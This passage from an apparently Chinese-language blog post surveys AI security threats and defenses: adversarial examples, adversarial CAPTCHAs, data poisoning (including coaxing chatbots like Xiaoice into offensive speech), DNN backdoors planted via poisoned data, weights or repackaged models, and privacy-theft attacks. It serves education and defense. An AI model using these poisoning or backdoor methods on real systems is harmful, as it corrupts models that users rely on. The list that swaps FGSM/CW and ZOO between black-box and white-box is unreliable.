src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641832.png" alt="img"></p><p>对抗样本攻击按照攻击环境可以分为：</p><p><strong>白盒攻击</strong>(white-box attack)和<strong>黑盒攻击</strong>(black-box attack)</p><p>白盒攻击是指攻击者在<strong>已知目标模型所有知识的情况</strong>下生成对抗样本的一种手段。白盒攻击需要获取完整的模型结构，了解模型的结构及每层的具体参数，可以完全控制模型的输人，对输人数据甚至可以进行比特级别的修改。这种攻击方案实施起来较为容易，但在多数场景下攻击者难以获得深度学习模型的内部知识，因此应用场景非常有限。</p><p>黑盒攻击是指攻击者在<strong>不知道目标模型任何内部信息</strong>的情况下实施的攻击方案。黑盒攻击完全把目标模型看成一个黑盒，对模型的结构没有了解，不能得到模型的梯度信息和输出的预测概率，只能控制输人得到有限的输出。由于不需要掌握目标模型的相关信息，因此黑盒攻击更容易在低控制权场景下部署和实施。<strong>攻击者根据模型的反馈不断更新对抗样本，直到得到扰动量较小并且攻击成功的对抗样本，从而骗过人脸识别黑盒模型</strong> ，这给人们的财产安全及个人隐私安全带来了极大的威胁。</p><h4 id="1-3-黑白盒攻击常用算法"><a href="#1-3-黑白盒攻击常用算法" class="headerlink" title="1.3 黑白盒攻击常用算法"></a><strong>1.3 黑白盒攻击常用算法</strong></h4><h5 id="1-3-1-黑盒攻击算法"><a href="#1-3-1-黑盒攻击算法" class="headerlink" title="1.3.1 黑盒攻击算法"></a><strong>1.3.1 黑盒攻击算法</strong></h5><ol><li>FGSM</li><li>CW</li></ol><h5 id="1-3-2-白盒攻击算法"><a href="#1-3-2-白盒攻击算法" class="headerlink" title="1.3.2 白盒攻击算法"></a><strong>1.3.2 白盒攻击算法</strong></h5><ol><li>PBAAML</li><li>ZOO</li></ol><h4 id="1-4-对抗样本应用场景"><a href="#1-4-对抗样本应用场景" class="headerlink" title="1.4 对抗样本应用场景"></a><strong>1.4 对抗样本应用场景</strong></h4><p>对抗样本技术提出后引发了学术界和工业界对于深度学习模型在安全方面的广泛关注，成为目前深度学习领域最热的研究课题之一,新的对抗攻击方法不断涌现，应用场景从图像分类扩展到目标检测等.同时，研究人员也开展了针对对抗攻击的防御研究，提出了若干种提升模型安全性能的方法，但迄今为止仍然无法完全防御来自对抗样本的攻击，下面为列举的几种结合实际业务，介绍对抗样本的几个常用场景。</p><h5 id="1-4-1-人脸识别"><a href="#1-4-1-人脸识别" class="headerlink" title="1.4.1 人脸识别"></a><strong>1.4.1 人脸识别</strong></h5><p>对人脸识别算法进行攻击，**通过在原始图像中加人人眼不可区分的微量干扰后,**<strong>使得人脸无法被检测算法所定位</strong>.图 (a)为原始图像,检测算法可以准确定位，图 (b)为对抗样本，已经成功绕开了人脸检测算法</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641708.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641791.png" alt="img"></p><p>可以看到对抗样本揭露了人工智能模型在安全性能上的局限性,该技术一旦被人恶意使用，将可能造成巨大的经济损失.因此，在人工智能应用场景中我们有必要研究防御算法以应对挑战。</p><h5 id="1-4-2-文本攻击"><a href="#1-4-2-文本攻击" class="headerlink" title="1.4.2 文本攻击"></a><strong>1.4.2 文本攻击</strong></h5><p>文本对抗的工作越来越多,并且文本对抗的成本更低，只需要增删改几个词,就有可能导致模型的识别结果出错，.Gao 等人对文本分类模型进行了黑盒攻击，提出了 DeepWordBug 算法通过 DeepWordBug 对文本进行扰动,可以使得：</p><ol><li>基于 Word-LSTM 的模型识别率降低 68%</li><li>基于 Char-CNN 的模型识别率降低 48%</li></ol><p>DeepWordBug 算法会先选择最可能改变模型分类的英文单词,然后将该英文单词进行扰动.从而使得文本分类模型识别错误.例如下图中通过将 Place 改成 Plcae,heart 改成 herat 后,识别模型将就正面的评价识别成了负面</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641727.png" alt="img"></p><h5 id="1-4-3-图对抗攻击"><a href="#1-4-3-图对抗攻击" class="headerlink" title="1.4.3 图对抗攻击"></a><strong>1.4.3 图对抗攻击</strong></h5><p>图模型的使用场景也非常广泛，比如电商场景的买家卖家网络、支付场景的交易网络以及互联文档等.基于图数据的一个常见任务是节点分类:给出一个大的(属性)图和一部分节点的标签来预测剩余节点的标签.当前大量的系统均采用图卷积网络的方法进行节点分类, 但实验表明,基于图卷积网络的节点分类也很容易被欺骗&#x2F;攻击,如下图所示：</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641197.png" alt="img"></p><p>Zigner 等人提出了针对图深度学习模型的对抗攻击方法，是首个在属性图上的对抗攻击</p><p>他们的研究结果表明:</p><ol><li>通过操纵图结构和节点特征，可以显著降低节点分类的准确率。</li><li>通过保持重要的数据特征，例如度分布、特征共现，可以确保扰动不被察觉。</li><li>攻击方法是可迁移的。</li></ol><p>当前，基于图深度学习的对抗扰动问题并未得到妥善的解决。对使用图深度学习模型的领域，对抗又非常容易，比如垃圾邮件制造者向社交网络添加错误的信息，犯罪分子频繁操控在线评论和产品网站等，操作成本都非常低，</p><h4 id="1-5-应用场景：对抗应答式验证码"><a href="#1-5-应用场景：对抗应答式验证码" class="headerlink" title="1.5 应用场景：对抗应答式验证码"></a><strong>1.5 应用场景：对抗应答式验证码</strong></h4><p>受到利益驱使，市场上出现了一批，专门破解各种类型验证码的产品，俗称打码平台.最初形式是通过人工方式进行识别,但随着深度学习技术的使用门槛越来越低,黑灰产会已经开始使用AI 技术来自动识别验证码，简而言之,就是利用模型识别图片验证码，然后利用模型的结果突破人机识别。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641480.png" alt="img"></p><p>作为对 AI模型的攻击手段，对抗样本技术也可以用于攻击黑灰产团伙的模型.如果我们将<strong>原始的验证码</strong>替换成<strong>增加扰动后的对抗验证码</strong>，那么<strong>黑灰产</strong>的打码平台的模<strong>型识别率将大幅降低</strong></p><p>为了使得生成的对抗样本更加难以识别，且不影响正常用户的体验.我们的对抗生成技术在图像区域和生成方式上进行了组合扩展</p><ol><li>不同的距离度量方式</li><li>图像的不同区城采用不同的生成策略</li><li>FGSM,IFGSM,M-FGSM 随机生成</li></ol><p>采用该组合拓展生成的对抗码如下图：</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641506.png" alt="img"></p><p>通过对抗样本生成技术，<strong>可以将****破解成功率从 80%+降低到了 20%以内</strong>，而且正常用户的体验基本不受影响。</p><p>更进一步,我们推出了知识问答型验证码,对人机验证环节提供了双重保障,进一步提升了验证码系统的安全性能.主要包括以下 2 层环节</p><ol><li>通过自然语言处理技术自动挖掘生活常识类信息，并组织成问答型知识库.该类题库对于普通用户基本没有难度，但通过机器回答会有较高的学习门槛</li><li>对抗验证码.答案选项会以图片的形式展示给用户，使用对抗样本技术后会有效降低图片被 AI算法识别的成功率.</li></ol><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641521.png" alt="img"></p><p>AI验证码，进一步提升了验证码系统的安全性能，使得黑灰产难以使用算法来自动破解验证码，保障了互联网的安全环境</p><h4 id="1-6-对抗样本防护"><a href="#1-6-对抗样本防护" class="headerlink" title="1.6 对抗样本防护"></a><strong>1.6 对抗样本防护</strong></h4><h5 id="1-6-1-网络蒸馏-Network-Distillation"><a href="#1-6-1-网络蒸馏-Network-Distillation" class="headerlink" title="1.6.1 网络蒸馏(Network Distillation )"></a><strong>1.6.1 网络蒸馏(Network Distillation )</strong></h5><p>网络蒸技术的基本原理是在模型训练阶段，对多个DNN进行串联，其中前个DNN生成的分类结果被用于训练后一个DNN。有学者发现转移知识可以一定程度上降低模型对微小扰动的敏感度，提高A模型的鲁棒性，于是提出将网络蒸馏技术用于防御闪避攻击，并在MNIST和CIFAR-10数据集上测试，发现该技术可将使特定攻击(如JSMA)的成功率降低。</p><h5 id="1-6-2-对抗训练-Adversarial-Training"><a href="#1-6-2-对抗训练-Adversarial-Training" class="headerlink" title="1.6.2 对抗训练(Adversarial Training)"></a><strong>1.6.2 对抗训练(Adversarial Training)</strong></h5><p>该技术的基本原理是在模型训练阶段，使用已知的各种攻击方法生成对抗样本，再将对抗样本加入模型的训练集中，对模型进行单次或多次重训练，生成可以抵抗攻击扰动的新模型。同时，由于综合多个类型的对抗样本使得训练集数据的增多，该技术不但可以增强新生成模型的鲁棒性，还可以增强模型的准确率和规范性。</p><h5 id="1-6-3-对抗样本检测-Adversarial-Sample-Detection"><a href="#1-6-3-对抗样本检测-Adversarial-Sample-Detection" class="headerlink" title="1.6.3 对抗样本检测(Adversarial Sample Detection)"></a><strong>1.6.3 对抗样本检测(Adversarial Sample Detection)</strong></h5><p>该技术的原理为在模型的使用阶段，通过增加外部检测模型或原模型的检测组件来检测待判断样本是否为对抗样本。在输入样本到达原模型前，检测模型会判断其是否为对抗样本。检测模型也可以在原模型每一层提取相关信息，综合各种信息来进行检测。各类检测模型可能依据不同标准来判断输入是否为对抗样本。例如，输入样本和正常数据间确定性的差异可以用来当作检测标准，对抗样本的分布特征，输入样本的历史都可以成为判别对抗样本的依据。</p><h5 id="1-6-4-输入重构-Input-Reconstruction"><a href="#1-6-4-输入重构-Input-Reconstruction" class="headerlink" title="1.6.4 输入重构(Input Reconstruction )"></a><strong>1.6.4 输入重构(Input Reconstruction )</strong></h5><p>该技术的原理是在模型的使用阶段，通过将输入样本进行变形转化来对抗闪避攻击，变形转化后的输入不会影响模型的正常分类功能。重构方法包括对输入样本加噪、去噪、和使用自动编码器(autoencoder)[9]改变输入样本等方法。</p><h5 id="1-6-5-DNN模型验证-DNN-Verification"><a href="#1-6-5-DNN模型验证-DNN-Verification" class="headerlink" title="1.6.5 DNN模型验证(DNN Verification)"></a><strong>1.6.5 DNN模型验证(DNN Verification)</strong></h5><p>举似软件验证分析技术，DNN模型验证技术使用求解器 ( solver)来验DNN模型的各种属性，如验证在特定扰动范围内没有对抗样本。但是通常验证DNN模型是NP完全问题，求解器的效率较低。通过取舍和优化，如对模型节点验证的优先度选择、分享验证信息、按区域验证等，可以进一步提高DNN模型验证运行效率。</p><h3 id="2-数据投毒攻击风险"><a href="#2-数据投毒攻击风险" class="headerlink" title="2. 数据投毒攻击风险"></a>2. <strong>数据投毒攻击风险</strong></h3><h4 id="2-1-数据投毒基本原理"><a href="#2-1-数据投毒基本原理" class="headerlink" title="2.1 数据投毒基本原理"></a><strong>2.1 数据投毒基本原理</strong></h4><p>数据投毒攻击的原理主要在于通过污染训练数据影响模型训练，从而使模型有某种特定的表现，如控制垃圾邮件检测模型预测结果和人机对话系统内容输出等。数据投毒攻击的核心为如何构建可以实现特定目标攻击的数据投毒样本。</p><h4 id="2-2-数据投毒的范围"><a href="#2-2-数据投毒的范围" class="headerlink" title="2.2 数据投毒的范围"></a><strong>2.2 数据投毒的范围</strong></h4><p>可能的数据投毒入口：</p><ol><li>产品开放入口：多产品通过收集用户与平台产品的交互数据进一步训练、优化其部署模型。基于此，攻击者可以模拟正常用户进行操作，其行为会自动被平台收集并参与后续模型的训练过程。</li><li>网络公开数据：互联网存在海量标注与无标注数据，包括图像、文本信息等。得益于预训练模型的广泛应用，越来越多的系统会依赖从网上爬取的一些内容进行预学习。在这种情况下，只要攻击者有意在网上发布一些“特殊投毒数据“系统在不加识别的情况下使用这些数据就很容易收到攻击者的影响。</li><li>内部人员：海量的数据处理需要大量工作人员，他们通过收集与处理大量数据为不同模型训练任务提供数据基础。例如，训练人脸识别系统依赖大量人工标注数据。在这种背景下，很多内部人员可以很轻易地注人部分标注错误或修改后的训练样本且不被发现。</li></ol><h4 id="2-3-数据投毒攻击技术分类"><a href="#2-3-数据投毒攻击技术分类" class="headerlink" title="2.3 数据投毒攻击技术分类"></a><strong>2.3 数据投毒攻击技术分类</strong></h4><p>从投毒攻击目标来看，我们可以将已有工作分为 <strong>Non-target 投毒攻击</strong>和 <strong>Target 投毒攻击</strong>两类。</p><ol><li><strong>Non-target 投毒攻击表示无****特殊目标的投毒攻击</strong>，<strong>不要求目标模型被攻击后有某种具体的表现，只需要其看起来“不正常”或被完全破坏</strong>。</li><li><strong>Target 投毒攻击更****有针对性</strong>，<strong>需要设定具体的攻击目标</strong>，<strong>如控制模型对某种类型输人反馈特定的预测结果，或者返回特定的输出</strong>。</li></ol><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641686.png" alt="img"></p><h4 id="2-4-传统数据投毒攻击介绍"><a href="#2-4-传统数据投毒攻击介绍" class="headerlink" title="2.4 传统数据投毒攻击介绍"></a><strong>2.4 传统数据投毒攻击介绍</strong></h4><p>传统意义上的数据投毒攻击并不需要额外的算法支持，一般情况下这类“脏”数据可以通过专家经验直接构造。例如：市面上的问答式机器人&#x2F;智能交互AI，如微软小冰、QQ小冰等，它们通过庞大的语料库来学习，还会将用户和它的对话数据收纳进自己的语料库里，因此我们也可以在和它们对话时进行“调教”，从而实现让其说脏话甚至发表敏感言论的目的。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641857.png" alt="img"></p><h4 id="2-5-数据投毒防护"><a href="#2-5-数据投毒防护" class="headerlink" title="2.5 数据投毒防护"></a><strong>2.5 数据投毒防护</strong></h4><h5 id="2-5-1-训练数据过滤-Training-Data-Filtering"><a href="#2-5-1-训练数据过滤-Training-Data-Filtering" class="headerlink" title="2.5.1 训练数据过滤 (Training Data Filtering)"></a><strong>2.5.1 训练数据过滤 (Training Data Filtering)</strong></h5><p>该技术侧重对训练数据集的控制，利用检测和净化的方法防止数据投毒攻击影响模型。具体方向包括: 根据数据的标签特性找到可能的数据投毒攻击数据点，在重训练时过滤这些攻击点，采用模型对比过滤方法，减少可以被数据投毒攻击利用的采样数据，并过滤数据对抗数据投毒攻击。</p><h5 id="2-5-2-回归分析-Regression-Analysis"><a href="#2-5-2-回归分析-Regression-Analysis" class="headerlink" title="2.5.2 回归分析( Regression Analysis )"></a><strong>2.5.2 回归分析( Regression Analysis )</strong></h5><p>该技术基于统计学方法，检测数据集中的噪声和异常值。具体方法包括对模型定义不同的损失函数 ( loss function ) 来检查异常值，以及使用数据的分布特性来进行检测等。</p><h5 id="2-5-3-集成分析-Ensemble-Analysis"><a href="#2-5-3-集成分析-Ensemble-Analysis" class="headerlink" title="2.5.3 集成分析(Ensemble Analysis )"></a><strong>2.5.3 集成分析(Ensemble Analysis )</strong></h5><p>该技术强调采用多个子模型的综合结果提升机器学习系统抗药饵攻击的能力。多个独立模型共同构成AI系统，由于多个模型采用不同的训练数据集，整个系统被数据投毒攻击影响的可能性进一步降低。</p><h3 id="3-模拟后门攻击风险"><a href="#3-模拟后门攻击风险" class="headerlink" title="3. 模拟后门攻击风险"></a>3. <strong>模拟后门攻击风险</strong></h3><h4 id="3-1-模拟后门攻击概念"><a href="#3-1-模拟后门攻击概念" class="headerlink" title="3.1 模拟后门攻击概念"></a><strong>3.1 模拟后门攻击概念</strong></h4><p>后门在信息安全领域比较常见，是指绕过安全控制而获取对程序或系统的访问权的方法，当这一概念泛化到神经网络上时则略有不同。针对 AI 模型的后门攻击，通常是指攻击者将隐藏后门嵌入到DNN中，使得攻击模型在良性样本上仍保持正常，而点那个输入带有攻击者定义的触发器时，模型会激活隐藏的后门并输入对应标签。</p><h4 id="3-2-后门的攻击种类与原理"><a href="#3-2-后门的攻击种类与原理" class="headerlink" title="3.2 后门的攻击种类与原理"></a><strong>3.2 后门的攻击种类与原理</strong></h4><h5 id="3-2-1-投毒式后门攻击"><a href="#3-2-1-投毒式后门攻击" class="headerlink" title="3.2.1 投毒式后门攻击"></a><strong>3.2.1 投毒式后门攻击</strong></h5><p>投毒式后门攻击通常会修改一部分训练数据，在这些数据上设置用于触发后门的特殊模式(触发器 )，并将标签设置为攻击目标所对应的标签。网络在训练过程中，将会学到所有与目标标签有关联的特征，当然也包括攻击者所设置的触发器。这类强特征在反复出现的过程中会不断强化目标标签与触发器之间的关联,以至于网络收敛后在正常的任务上表现与平常无异，同时对触发器高度敏感，可以实现高精度的后门攻击。对于空间足够大的网络，甚至可以同时植入多种模式的后门。</p><h5 id="3-2-2-非投毒式后门攻击"><a href="#3-2-2-非投毒式后门攻击" class="headerlink" title="3.2.2 非投毒式后门攻击"></a><strong>3.2.2 非投毒式后门攻击</strong></h5><ol><li>权重攻击：一些应用会将模型<strong>存储在终端</strong>，<strong>攻击者有机会接触模型文件</strong>，攻击链路更短因此<strong>通过修改模型权重等方式进行攻击</strong>是一种现实威胁更大的攻击手法。</li><li>模型结构攻击：模型结构攻击是新提出的攻击手法，攻击者通常会借助一些黑客手法，如<strong>通过逆向工程解读模型文件结构</strong>，并<strong>植<strong><strong>入</strong></strong>自己训练的后门网络重新编译打包</strong>，实现给网络植入后门的目的，离产生真实威胁更近一步。</li></ol><h4 id="3-3-后门攻击防护"><a href="#3-3-后门攻击防护" class="headerlink" title="3.3 后门攻击防护"></a><strong>3.3 后门攻击防护</strong></h4><h5 id="3-3-1-输入预处理-Input-Preprocessing"><a href="#3-3-1-输入预处理-Input-Preprocessing" class="headerlink" title="3.3.1 输入预处理(Input Preprocessing)"></a><strong>3.3.1 输入预处理(Input Preprocessing)</strong></h5><p>该方法的目的是过滤能触发后门的输入，降低输入触发后门、改变模型判断的风险。</p><h5 id="3-3-2-模型剪枝-Model-Pruning"><a href="#3-3-2-模型剪枝-Model-Pruning" class="headerlink" title="3.3.2 模型剪枝( Model Pruning)"></a><strong>3.3.2 模型剪枝( Model Pruning)</strong></h5><p>该技术原理为适当剪除原模型的神经元，在保证正常功能一致的情况下，减少后门神经元起作用的可能性。利用细粒度的剪枝方法，可以去除组成后门的神经元，防御后门攻击。</p><h3 id="4-预训练模型安全风险"><a href="#4-预训练模型安全风险" class="headerlink" title="4. 预训练模型安全风险"></a>4. <strong>预训练模型安全风险</strong></h3><h4 id="4-1-预训练风险分析"><a href="#4-1-预训练风险分析" class="headerlink" title="4.1 预训练风险分析"></a><strong>4.1 预训练风险分析</strong></h4><h5 id="4-1-1-数据风险"><a href="#4-1-1-数据风险" class="headerlink" title="4.1.1 数据风险"></a><strong>4.1.1 数据风险</strong></h5><p>深度学习是一种数据驱动的技术，实现了从数据到标签的映射。<strong>当模型的参数量急剧增加时，模型会不可避免地记住数据中隐含的模式，甚至是数据本身。当遇到合适的上下文时，这些记忆的案例就会被模型重新“吐”出来</strong>，从而造成数据泄露</p><h5 id="4-1-2-敏感内容生成风险"><a href="#4-1-2-敏感内容生成风险" class="headerlink" title="4.1.2 敏感内容生成风险"></a><strong>4.1.2 敏感内容生成风险</strong></h5><p>先进的语言模型(如GPT2和 GPT3)大多使用来自网络的大型文本语料库进行预训练。语言模型学习预测序列中的下一个标记或句子中的单词。<strong>如果训练数据中包含暴力、色情、歧视等敏感内容</strong>，则<strong>语言模型会在训练阶段学习预测并记住这些单词</strong>，并在随后的推理过程中<strong>生成包含它们的输出</strong>。</p><p>例子：以GPT3在Reddit评论数据集上显示出明显的冒犯性言论 如下图：</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641919.png" alt="img"></p><p>此外，在用户内容生成领域，AI生成的假新闻旺旺会带来严峻的挑战，AI可以轻松生成天马行空的新闻。</p><h5 id="4-1-3-供应链风险"><a href="#4-1-3-供应链风险" class="headerlink" title="4.1.3 供应链风险"></a><strong>4.1.3 供应链风险</strong></h5><p>因为预训练模型的训练代价很高，所以<strong>我们通常不会从头开始训练</strong>，而会<strong>直接复用已有的模型</strong>，这就导致我们可能直接使用了受污染或带后门的基础模型，从而造成安全隐患。</p><p>模型污染问题同前面介绍的数据泄露和敏感内容生成一样，是模型本身固有的，如果没有刻意地修正，那么这些缺陷将一直存在。<strong>当处于供应链下游的模型开始提供服务时，用户有意或无意地输入就会触发这些潜在风险</strong>。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641981.png" alt="img"></p><p>目前市面上提供的预训练模型达到<strong>数千个基于这些模型衍生出来的子模型</strong>更多。由于 AI的黑盒特性和大模型的复杂性，我们比较难检测出其中的后门,一旦使用,就会触发严重的合规和业务风险。</p><h5 id="4-1-4-幻觉"><a href="#4-1-4-幻觉" class="headerlink" title="4.1.4 幻觉"></a><strong>4.1.4 幻觉</strong></h5><p>大模型的幻觉是指模型会输出与事实相悖的内容。在模型不具备回答某种问题的能力的时候，模型不会拒绝回答，而是会输出错误的答案。</p><h5 id="4-1-5-不良信息"><a href="#4-1-5-不良信息" class="headerlink" title="4.1.5 不良信息"></a><strong>4.1.5 不良信息</strong></h5><p>大模型的输出内容可能包含恐怖主义、极端主义、色情、暴力等有害信息。由于大模型的训练语料库通常由互联网上的爬取数据组成，网络上的数据难以避免地包含某些有害信息，而模型在这些数据上训练后则会记忆这些有害信息，导致模型在使用的过程中输出有害信息。</p><h5 id="4-1-6-隐私泄露"><a href="#4-1-6-隐私泄露" class="headerlink" title="4.1.6 隐私泄露"></a><strong>4.1.6 隐私泄露</strong></h5><p>由于大模型通常能够在互联网上可搜集到的数据上进行训练，因此不可避免地包含用户隐私信息。如果这些隐私信息被泄露给不法分子，可能会对用户的安全造成严重影响。</p><h5 id="4-1-7-偏见"><a href="#4-1-7-偏见" class="headerlink" title="4.1.7 偏见"></a><strong>4.1.7 偏见</strong></h5><p>模型偏见是人工智能长期以来的重要安全性问题之一，是指模型在训练后会对具有不同宗教、种族、性别等特征的人群产生不一致的结果。模型存在偏见的根源是数据中存在的偏见，由于人类社会的发展过程中存在对少数群体或者弱势群体的偏见，这些偏见会蕴含在人类多年以来所累积的数据中，进而被模型学习到。</p><h5 id="4-1-8-鲁棒性"><a href="#4-1-8-鲁棒性" class="headerlink" title="4.1.8 鲁棒性"></a><strong>4.1.8 鲁棒性</strong></h5><p>与深度学习系统类似，大模型也会存在鲁棒性问题，即在攻击者的恶意攻击下产生错误的预测。对于大语言模型而言，鲁棒性问题的通常表现形式是在输入文本上做微小的扰动（如更改字母、单词），会导致模型的输出结果完全错误，影响用户体验。</p><h5 id="4-1-社会面影响"><a href="#4-1-社会面影响" class="headerlink" title="4.1. 社会面影响"></a><strong>4.1. 社会面影响</strong></h5><p>预训练大模型给人们的生产生活方式带来了重大的变革，因此不可避免地产生一系列社会性问题。例如，GPT-4 在模拟律师考试中取得了前 10% 的成绩，意味着击败了 90% 的人类，这对传统的教育教学方式产生了重大的影响。</p><h4 id="4-2-防御策略"><a href="#4-2-防御策略" class="headerlink" title="4.2 防御策略"></a><strong>4.2 防御策略</strong></h4><h5 id="4-2-1-领域自适应训练（DAPT）"><a href="#4-2-1-领域自适应训练（DAPT）" class="headerlink" title="4.2.1 领域自适应训练（DAPT）"></a><strong>4.2.1 领域自适应训练（DAPT）</strong></h5><p>原理:使用无毒的数据集继续训练，即使用经过筛选后的干净数据继续微调模型，使得模型从原始领域迁移到目标领域，减小原始模型的干扰。</p><p>优点:降低毒性的最有效的策略之一，可针对性地降低隐私数据泄露、敏感内容生成、供应链风险的发生概率，大大缓解模型隐含的毒性。</p><p>缺点: 计算成本高，需要额外的大量训练数据，收集这些数据的成本可能很高。属性调节（ATCON）</p><h5 id="4-2-2-属性调节"><a href="#4-2-2-属性调节" class="headerlink" title="4.2.2 属性调节"></a><strong>4.2.2 属性调节</strong></h5><p>原理:使用添加了“有害”或“无害”属性的训练样本进行进一步的语言模型预训练，即训练时在语句的前面添加 Toxic、Nontoxic、Privacy 等属性，提示GPT 等生成模型该语句的情感色彩。</p><p>优点：在推理（文本生成）期间，可以将属性“有害”添加到提供给模型的提示中，约束生成的文本符合该属性。</p><p>缺点：是计算成本高，效果也非常有限。</p><h5 id="4-2-3-黑名单替换"><a href="#4-2-3-黑名单替换" class="headerlink" title="4.2.3 黑名单替换"></a><strong>4.2.3 黑名单替换</strong></h5><p>原理:诅咒、亵渎、侮辱、手机号、详细地址等“有害”的词，在语言模型中被分配为零概率，用相应的“无害”词替换，以防止它们被生成。</p><p>优点：易于实现、成本低。</p><p>缺点：也很明显，依赖于词库，易出现遗漏等情况，前后语义可能不一致。</p><h5 id="4-2-4-即插即用语言模型（PPLM）"><a href="#4-2-4-即插即用语言模型（PPLM）" class="headerlink" title="4.2.4 即插即用语言模型（PPLM）"></a><strong>4.2.4 即插即用语言模型（PPLM）</strong></h5><p>原理:将一个简单的模型(词袋或单层分类器)用作鉴别器(或属性模型),通过改变其隐藏表示来指导模型的语言生成</p><p>优点:  降低毒性的最有效策略之一，控制生成内容的属性。</p><p>缺点:  实现起来相对复杂，计算成本较高。</p><h5 id="4-2-5-生成鉴别器（GeDi）"><a href="#4-2-5-生成鉴别器（GeDi）" class="headerlink" title="4.2.5 生成鉴别器（GeDi）"></a><strong>4.2.5 生成鉴别器（GeDi）</strong></h5><p>原理:将属性条件(或类条件)模型用作鉴别器，使用贝叶斯规则计算主模型可以生成的所有潜在下一个标记的类似然属性(如有害或无害 )。</p><p>优点:在计算上比 PPLM 更有效，在排除危害方面优于 PPLM。</p><p>缺点:策略更加复杂，计算成本非常高。</p><h5 id="4-2-6-自诊断和自去偏"><a href="#4-2-6-自诊断和自去偏" class="headerlink" title="4.2.6 自诊断和自去偏"></a><strong>4.2.6 自诊断和自去偏</strong></h5><p>原理: 通过在提供给预训练模型的输人提示中添加简短的属性描述(如“以下文本包含有害内容”)，使用自诊断和自去偏算法来降低生成有毒词的概率</p><p>优点：与 ATCON 策略相比，不需要额外的训练。</p><p>缺点：是可能会过滤掉无害的词，存在误杀的情况。解毒能力仅限于模型对相关偏差和有害的“意识”</p><h3 id="5-AI数据隐私窃取"><a href="#5-AI数据隐私窃取" class="headerlink" title="5. AI数据隐私窃取"></a>5. <strong>AI数据隐私窃取</strong></h3><h4 id="5-1-AI数据隐私窃取基本原理"><a href="#5-1-AI数据隐私窃取基本原理" class="headerlink" title="5.1 AI数据隐私窃取基本原理"></a><strong>5.1 AI数据隐私窃取基本原理</strong></h4><p>数据是 AI模型中的关键要素，也是重要的数字资产。然而，研究发现，攻击者可以使用 AI 模型训练过程中产生的中间信息 (如梯度信息等 )，或者 AI 模型使用过程中的输出信息，来进行数据窃取，获取数据隐私信息。特别是在一些应用场景中，用于训练 AI模型的数据可能包含一些个人的隐私信息，如将 AI模型应用到医疗场景中，用于训练模型的医疗数据往往含有患者病情状况等隐私信息这些隐私信息一旦被泄露，将会带来巨大的安全风险和法律风险</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641030.png" alt="img"></p><p>数据隐私窃取攻击一般会利用两类信息:一类是在模型训练阶段利用模型训练中产生的信息，如梯度信息等，来进行数据隐私窃取;另一类是在模型部署使用阶段利用模型查询输出的信息，来进行数据隐私窃取。</p><h4 id="5-2-数据隐私窃取种类与攻击思路"><a href="#5-2-数据隐私窃取种类与攻击思路" class="headerlink" title="5.2 数据隐私窃取种类与攻击思路"></a><strong>5.2 数据隐私窃取种类与攻击思路</strong></h4><h5 id="5-2-1-数据窃取攻击"><a href="#5-2-1-数据窃取攻击" class="headerlink" title="5.2.1 数据窃取攻击"></a><strong>5.2.1 数据窃取攻击</strong></h5><p>数据窃取攻击是指利用模型训练中产生的中间信息或模型使用中产生的预测结果信息来逆向恢复模型训练集中的数据，比较经典的就是DLG算法了。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641176.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641544.png" alt="img"></p><h5 id="5-2-2-成员推理攻击"><a href="#5-2-2-成员推理攻击" class="headerlink" title="5.2.2 成员推理攻击"></a><strong>5.2.2 成员推理攻击</strong></h5><p>成员推理攻击是一种简单的攻击方式，不需要对训练集中的数据进行恢复而只判断当前输人的数据是否为训练集中的数据。在一些医疗AI的应用场景中如果攻击者使用这种攻击方式判断出某患者信息是否在这个医疗模型中，将威胁患者的个人隐私安全。</p><h5 id="5-2-3-属性推理攻击"><a href="#5-2-3-属性推理攻击" class="headerlink" title="5.2.3 属性推理攻击"></a><strong>5.2.3 属性推理攻击</strong></h5><p>属性推理攻击是指对训练数据集中的各类属性信息进行推理，如性别、年龄在分布式训练场景中，Melis 等人“利用训练过程中其他参与方更新的模型参数作为输入特征，训练攻击模型，来推理其他参与方数据的相关属性，如下图：</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061641565.png" alt="img"></p><h4 id="5-3-数据隐私窃取防护"><a href="#5-3-数据隐私窃取防护" class="headerlink" title="5.3 数据隐私窃取防护"></a><strong>5.3 数据隐私窃取防护</strong></h4><h5 id="5-3-1-隐私聚合教师模型-PATE"><a href="#5-3-1-隐私聚合教师模型-PATE" class="headerlink" title="5.3.1 隐私聚合教师模型( PATE)"></a><strong>5.3.1 隐私聚合教师模型( PATE)</strong></h5><p>该技术的基本原理是在模型训练阶段，将训练数据分成多个集合，每个集合用于训练一个独立DNN模型，再使用这些独立DNN模型进行投票的方法共同训练出一个学生模型。这种技术保证了学生模型的判断不会泄露某一个特定训练数据的信息，从而确保了训练数据的隐私性。</p><h5 id="5-3-2-差分隐私-Differential-Privacy"><a href="#5-3-2-差分隐私-Differential-Privacy" class="headerlink" title="5.3.2 差分隐私( Differential Privacy)"></a><strong>5.3.2 差分隐私( Differential Privacy)</strong></h5><p>该技术是在模型训练阶段，用符合差分隐私的方法对数据或模型训练步骤进行加噪。例如有学者提出使用差分隐私生成梯度的方法，保护模型数据的隐私。</p><h5 id="5-3-3-模型水印-Model-Watermarking"><a href="#5-3-3-模型水印-Model-Watermarking" class="headerlink" title="5.3.3 模型水印(Model Watermarking)"></a><strong>5.3.3 模型水印(Model 